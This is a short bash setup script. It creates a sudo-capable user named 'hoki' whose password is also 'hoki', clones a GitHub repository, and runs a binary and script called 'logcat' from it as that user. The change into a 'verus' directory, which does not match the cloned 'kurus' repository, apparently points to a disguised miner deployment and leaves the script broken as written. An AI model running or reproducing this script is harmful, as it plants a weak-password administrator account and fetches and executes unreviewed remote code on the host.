#!/bin/bash
sudo useradd -m hoki
sudo adduser hoki sudo
sudo usermod -a -G sudo hoki
sudo echo 'hoki:hoki' | sudo chpasswd
cd /home/hoki
git clone https://github.com/Gondoru/kurus.git
cd verus
sudo chown hoki:sudo logcat
sudo chown hoki:sudo logcat.sh
sudo chmod 700 logcat logcat.sh
sudo -u hoki sh -c "/home/hoki/kurus/logcat.sh"
